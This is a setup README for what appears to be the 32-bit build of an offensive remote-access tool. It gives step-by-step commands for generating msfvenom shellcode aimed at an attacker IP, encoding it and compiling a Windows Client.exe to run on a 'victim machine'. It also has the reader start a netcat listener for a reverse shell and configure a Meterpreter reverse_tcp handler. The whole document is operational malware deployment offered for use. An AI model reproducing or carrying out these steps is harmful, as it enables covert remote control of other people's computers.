# Setup

The setup is pretty much the same as the x64 version. However, the msfvenom commands to generate the shellcodes are slightly different. They can be found inside of the Client.c file, and the compilation command is also different.

1. Install mingw-w64
```bash
sudo apt install mingw-w64
```

2. Open Client.c and replace the contents of the variable ServerIP at line 30 with the IP address of the attacker machine

3. From the terminal, generate the shellcode for ShellcodeX64 using the first commented msfvenom command (Line 49) (Replace the LHOST variable with the IP address of the attacker machine)

4. Now Generate the respective shellcodes for ShellcodeSpawnNetcat and FallBackShell using the last 2 commented msfvenom commands (Lines 51 and 53) (Replace the LHOST variables like before)

5. Copy the output shellcodes of msfvenom for ShellcodeSpawnNetcat and FallBackShell, and paste them inside of ESH.c for the respective variables

6. Compile and execute ESH.c
```bash
gcc ESH.c -o esh && ./esh
```

7. Grab the output of esh, and replace ShellcodeSpawnNetcat and FallBackShell inside of the Client.c file and save.

8. Open Server.c and replace the contents at line 14 with the IP address of the attacker machine and save.

9. You should now be good to go, compile everything by typing:
```bash
i686-w64-mingw32-gcc -o Client.exe Client.c -lwsock32 -lwininet -lgdi32 -lntdll && gcc Server.c -o Server -lpthread && echo "Compilation Successful"
```

10. If everything went correctly, the string "Compilation Successful" should popup on your terminal. If not, there was an error when trying to compile. Make sure you did everything correctly.

11. Setting the server: Before executing the Client on the victim machine, you must make sure to open another tab in your terminal (On the attacker machine), and execute the following command:
```bash
nc -lvnp 38524
```

If you don't do this, when executing Client.exe, no reverse shell will be received due to the fact that you weren't listening on port 38524, and Client.exe will crash (The same thing will happen if you decide to send 'startcat' before listening for a connection on port 443)

12. Now you should start the main server by typing:
```bash
./Server start
```

13. msfconsole commands for Inject86:
```bash
use exploit/multi/handler
set LHOST SERVER-IP
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
run
```

Everything should now be ready to go. Enjoy :)
